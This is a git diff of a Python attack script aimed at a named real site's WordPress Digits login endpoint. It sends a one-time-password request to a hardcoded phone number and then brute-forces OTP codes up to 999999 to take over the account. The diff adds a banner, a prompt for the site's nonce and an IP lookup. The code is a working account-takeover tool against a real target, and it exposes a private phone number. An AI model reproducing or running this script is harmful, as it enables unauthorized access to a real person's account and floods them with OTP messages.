@@ -2,11 +2,32 @@ import time
 import requests
 from colorama import Fore
 from os import system
+import nonce_cod
 system('cls')
-
 
 # domain : https://rirabook.com/?login=true&page=1&redirect_to=https%3A%2F%2Frirabook.com%2F
 
+def banner():
+    print(Fore.BLUE+"""
+            ███                      █████                       █████     
+           ░░░                      ░░███                       ░░███      
+ ████████  ████  ████████   ██████   ░███████   ██████   ██████  ░███ █████
+░░███░░███░░███ ░░███░░███ ░░░░░███  ░███░░███ ███░░███ ███░░███ ░███░░███ 
+ ░███ ░░░  ░███  ░███ ░░░   ███████  ░███ ░███░███ ░███░███ ░███ ░██████░  
+ ░███      ░███  ░███      ███░░███  ░███ ░███░███ ░███░███ ░███ ░███░░███ 
+ █████     █████ █████    ░░████████ ████████ ░░██████ ░░██████  ████ █████
+░░░░░     ░░░░░ ░░░░░      ░░░░░░░░ ░░░░░░░░   ░░░░░░   ░░░░░░  ░░░░ ░░░░░ 
+                                                                        (c) Dadmehr . All rights reserved""")
+
+
+
+banner()
+i = nonce_cod.nonce(start='')
+print(i)
+nonce = input('nonce code :')
+system('cls')
+
+ip = requests.post("https://icanhazip.com").text
 
 url = 'https://rirabook.com/wp-admin/admin-ajax.php'
 json = {'accountkit': 0,
@@ -14,9 +35,9 @@ json = {'accountkit': 0,
         'code': "1"}
 
 data = {'action':'digits_check_mob',
-        'countrycode':'+98',
+        'countrycode':'+98', # decoded url
         'mobileNo':9050756226,
-        'csrf':'1fda326dc7',
+        'csrf':nonce,
         'login':1,
         'username':'',
         'email':'',
@@ -27,14 +48,14 @@ data = {'action':'digits_check_mob',
         'whatsapp':0,
         'mobmail':9050756226,
         'dig_otp':'',
-        'dig_nounce':'1fda326dc7',
+        'dig_nounce':nonce,
         'digits_redirect_page':'https://rirabook.com/'}
 
 sned_otp = requests.post(url=url,json=json,data=data).text
 
 if sned_otp == '{"accountkit":0,"firebase":0,"code":"1"}':
-    print(Fore.GREEN+'[*] OTP Code Sned phone')
-    time.sleep(5)
+    print(Fore.GREEN+'[*] OTP Code Sned phone | ',"Ip :",ip)
+    time.sleep(10)
 else:
     print(Fore.RED+'[*] OTP Code Sned Fail')
     time.sleep(5)
@@ -48,7 +69,7 @@ def OTP_Test():
         if sh == 999999:
             print(Fore.RED+'[*] OTP test fail')
 
-        print(Fore.YELLOW+"[*]",sh,"Test OTP Code")
+        print(Fore.YELLOW+"[*]",sh,"Test OTP Code | ","Ip :",ip)
 
         url_vrify = 'https://rirabook.com/wp-admin/admin-ajax.php'
 
@@ -60,7 +81,7 @@ def OTP_Test():
                       'mobileNo':9050756226,
                       'otp':sh,
                       'dig_ftoken':-1,
-                      'csrf':'1fda326dc7',
+                      'csrf':nonce,
                       'dtype':1,
                       'digits':1,
                       'rememberMe':False}
